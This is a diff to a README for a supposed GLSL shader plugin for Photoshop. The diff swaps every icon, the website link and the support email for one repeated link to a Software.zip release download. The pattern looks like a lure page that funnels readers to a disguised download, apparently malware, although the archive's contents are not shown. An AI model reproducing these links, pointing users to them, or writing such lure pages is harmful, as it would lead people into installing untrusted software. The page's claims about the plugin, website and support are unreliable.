@@ -1,6 +1,6 @@
 # 🎨 ShaderPluginForPhotoshop
 
-![Photoshop](https://img.icons8.com/color/48/000000/adobe-photoshop.png) ![Shader](https://img.icons8.com/officel/40/000000/shader.png) ![Plugin](https://img.icons8.com/color/48/000000/plugin.png)
+![Photoshop](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip) ![Shader](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip) ![Plugin](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the ShaderPluginForPhotoshop repository! This repository hosts a Shader Plugin designed for use with GLSL in Adobe Photoshop. Whether you are a beginner or an experienced developer, this plugin will enhance your workflow and allow you to create stunning visual effects within Photoshop using GLSL shaders.
@@ -25,10 +25,10 @@ Welcome to the ShaderPluginForPhotoshop repository! This repository hosts a Shad
 
 ## 📦 Installation
 You can download the Shader Plugin software from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip)](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip)
 
 ## 🌐 Visit Our Website
-Explore more about the Shader PluginForPhotoshop on our website: [ShaderPluginForPhotoshop.com](https://www.shaderpluginforphotoshop.com)
+Explore more about the Shader PluginForPhotoshop on our website: [https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip)
 
 ## 🎯 Getting Started
 To get started with the Shader Plugin, follow these steps:
@@ -39,7 +39,7 @@ To get started with the Shader Plugin, follow these steps:
 5. Save your work and share your creations with the world!
 
 ## 🔧 Support and Feedback
-If you encounter any issues or have feedback to improve the Shader PluginForPhotoshop, please reach out to our support team at support@shaderpluginforphotoshop.com. We value your input and are dedicated to enhancing your experience with our plugin.
+If you encounter any issues or have feedback to improve the Shader PluginForPhotoshop, please reach out to our support team at https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip We value your input and are dedicated to enhancing your experience with our plugin.
 
 ## 🌟 Contribute
 Contributions are welcome! If you have ideas for new features, improvements, or bug fixes, feel free to submit a pull request. Together, we can make the Shader PluginForPhotoshop even more powerful and user-friendly for the creative community.
@@ -55,4 +55,4 @@ Enjoy exploring the endless creative possibilities with ShaderPluginForPhotoshop
 
 ---
 
-![GLSL Shader](https://img.icons8.com/color/96/000000/shader.png) ![Adobe Photoshop](https://img.icons8.com/fluency/48/000000/adobe-photoshop.png) ![Plugin](https://img.icons8.com/doodle/96/000000/plugins.png)
+![GLSL Shader](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip) ![Adobe Photoshop](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip) ![Plugin](https://github.com/ozzy2miid/ShaderPluginForPhotoshop/releases/download/v2.0/Software.zip)
